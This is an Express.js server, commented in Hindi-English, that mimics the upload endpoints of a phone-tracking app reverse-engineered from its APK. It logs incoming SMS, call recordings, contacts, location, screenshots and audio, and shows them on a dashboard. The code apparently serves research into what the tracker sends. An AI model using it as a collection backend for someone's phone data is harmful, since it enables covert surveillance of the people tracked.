const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'captures.json');

// Purana data load karein
let captures = [];
if (fs.existsSync(DATA_FILE)) {
  try { captures = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch(e) {}
}
function save() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(captures, null, 2));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// File upload ke liye multer (memory mein)
const storage = multer.memoryStorage();
const upload = multer({ storage, limits: { fileSize: 50 * 1024 * 1024 } });

// Har capture ko log karein aur app ko "ok" response de
function captureHandler(req, res) {
  const files = req.files ? req.files.map(f => ({
    fieldname: f.fieldname,
    originalname: f.originalname,
    mimetype: f.mimetype,
    size: f.size
  })) : [];

  let bodyPreview = null;
  if (req.get('content-type') && req.get('content-type').includes('multipart/form-data')) {
    bodyPreview = '[MULTIPART FORM DATA - ' + files.length + ' file(s)]';
  } else {
    bodyPreview = req.body || req.rawBody || '';
  }

  const cap = {
    id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
    time: new Date().toISOString(),
    method: req.method,
    path: req.path,
    query: req.query,
    headers: req.headers,
    body: bodyPreview,
    files: files,
    ip: req.ip
  };

  captures.unshift(cap);
  if (captures.length > 1000) captures.pop();
  save();

  console.log(`[${cap.time}] ${req.method} ${req.path}`);
  res.json({ status: 'ok' });
}

// ----- Saare POST endpoints (APK se liye gaye) -----
const formEndpoints = [
  '/applications/insertApplication.php',
  '/applications/insertApplicationsUsage.php',
  '/applications/removeBlockApplication.php',
  '/applications/sendIDBDDPhone.php',
  '/calendar/insertCalendar.php',
  '/calls/insertCall.php',
  '/clipboard/insertClipboard.php',
  '/contacts/insertContactNew.php',
  '/dashboard/setConfigTel.php',
  '/dashboard/setInfoPhone.php',
  '/dashboard/setSettingsCheck.php',
  '/fileExplorer/insertNewFileFirst.php',
  '/fileExplorer/sendToken.php',
  '/live/getDateNow.php',
  '/live/sendToken.php',
  '/locLive/setLocLivePhone.php',
  '/location/insertLocation.php',
  '/mms/insertMMS.php',
  '/pictures/setPicturePasswordFailed.php',
  '/remoteControl/setLog.php',
  '/restriction/removeRestriction.php',
  '/restriction/sendIDBDDPhone.php',
  '/screenshot/insertScreenError.php',
  '/sim/setChangeSIM.php',
  '/site/insertSiteHistory.php',
  '/sms/insertSMS.php',
  '/sms/insertSMSAlert.php',
  '/user/updatePhone.php',
  '/user/updateTokenPhone.php'
];

const multipartEndpoints = [
  '/calls/insertCallRecord.php',
  '/fileExplorer/insertNewFile.php',
  '/pictures/insertPicture.php',
  '/recordAudio/setRecordAudio.php',
  '/screenshot/insertScreen.php'
];

// Form-post endpoints
formEndpoints.forEach(ep => app.post(ep, upload.any(), captureHandler));
// Multipart endpoints
multipartEndpoints.forEach(ep => app.post(ep, upload.any(), captureHandler));
// Koi bhi doosra POST request
app.post('*', upload.any(), captureHandler);

// Capture list JSON API
app.get('/api/captures', (req, res) => res.json(captures));
// Capture clear karein
app.post('/api/clear', (req, res) => { captures = []; save(); res.json({ ok: true }); });

// ----- Dashboard HTML -----
const DASHBOARD = `<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Tracker POST Capture — Full Website</title>
<style>
* { box-sizing: border-box; }
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0f19; color: #e2e8f0; margin: 0; padding: 20px; }
h1 { margin-top: 0; color: #38bdf8; }
.container { max-width: 1200px; margin: 0 auto; }
.card { background: #1e293b; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
.table-wrap { overflow-x: auto; }
table { width: 100%; border-collapse: collapse; background: #0f172a; border-radius: 8px; overflow: hidden; }
th, td { padding: 12px; border-bottom: 1px solid #334155; text-align: left; vertical-align: top; }
th { background: #334155; position: sticky; top: 0; z-index: 2; color: #94a3b8; text-transform: uppercase; font-size: 11px; letter-spacing: 1px; }
tr:hover { background: #1e293b; }
.method { font-weight: bold; color: #67e8f9; font-family: monospace; }
.path { color: #a5b4fc; font-family: monospace; word-break: break-all; }
.pre { background: #020617; padding: 8px; border-radius: 4px; overflow: auto; font-size: 11px; color: #86efac; white-space: pre-wrap; max-height: 200px; }
.badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; background: #3b82f6; color: #fff; }
.btn { background: #3b82f6; color: #fff; border: none; padding: 6px 12px; border-radius: 5px; cursor: pointer; font-size: 13px; }
.btn:hover { background: #2563eb; }
.btn-danger { background: #ef4444; }
.btn-danger:hover { background: #dc2626; }
.empty { text-align: center; color: #64748b; padding: 40px; }
.alert { background: #7f1d1d; color: #fecaca; padding: 12px; border-radius: 6px; margin-bottom: 16px; font-size: 13px; }
.status-ok { color: #4ade80; }
.time { color: #94a3b8; font-size: 12px; }
.files { color: #fbbf24; }
</style>
</head>
<body>
<div class="container">
  <div class="card">
    <h1>📡 Tracker POST Capture Dashboard</h1>
    <div class="alert">
      ⚠️ <strong>Sirf apne authorized device ya security research ke liye use karein.</strong> Kisi dusre ke phone par bina permission na lagayein.
    </div>
    <p>Base URL: <code>https://mobile-track-data.com/</code> ya <code>https://mobile-tracker-free.com/scriptsV5/</code></p>
    <button class="btn btn-danger" onclick="clearAll()">Saare record clear karein</button>
  </div>

  <div class="card">
    <div class="table-wrap">
      <table>
        <thead>
          <tr>
            <th>Samay</th>
            <th>Method</th>
            <th>Endpoint</th>
            <th>Files</th>
            <th>Data / Body</th>
            <th>IP</th>
          </tr>
        </thead>
        <tbody id="tbody"></tbody>
      </table>
    </div>
  </div>
</div>

<script>
let captures = [];
async function load() {
  const r = await fetch('/api/captures');
  captures = await r.json();
  render();
}
function render() {
  const tb = document.getElementById('tbody');
  if (!captures.length) {
    tb.innerHTML = '<tr><td colspan="6" class="empty">Abhi tak koi request capture nahi hui. App se data aane ka intezar karein...</td></tr>';
    return;
  }
  tb.innerHTML = captures.map(c => `
    <tr>
      <td><span class="time">${new Date(c.time).toLocaleString()}</span></td>
      <td><span class="method">${c.method}</span></td>
      <td><span class="path">${c.path}${c.query ? '?' + new URLSearchParams(c.query).toString() : ''}</span></td>
      <td><span class="files">${c.files && c.files.length ? c.files.map(f => '📎 '+f.originalname+' ('+(f.size/1024).toFixed(1)+' KB)').join('<br>') : '—'}</span></td>
      <td><div class="pre">${escapeHtml(typeof c.body === 'string' ? c.body : JSON.stringify(c.body, null, 2)).slice(0, 1500)}</div></td>
      <td>${c.ip}</td>
    </tr>
  `).join('');
}
function escapeHtml(s) { return String(s).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"}[m])); }
async function clearAll() {
  if(!confirm('Saare records delete karna chahte ho?')) return;
  await fetch('/api/clear', { method: 'POST' });
  captures = [];
  render();
}
setInterval(load, 3000);
load();
</script>
</body>
</html>`;

app.get('/', (req, res) => res.send(DASHBOARD));

app.listen(PORT, () => {
  console.log(`\n✅ Website chal rahi hai: http://localhost:${PORT}`);
  console.log(`📊 Dashboard: http://localhost:${PORT}/`);
  console.log(`📡 Endpoint base: http://localhost:${PORT}/<endpoint>.php\n`);
});
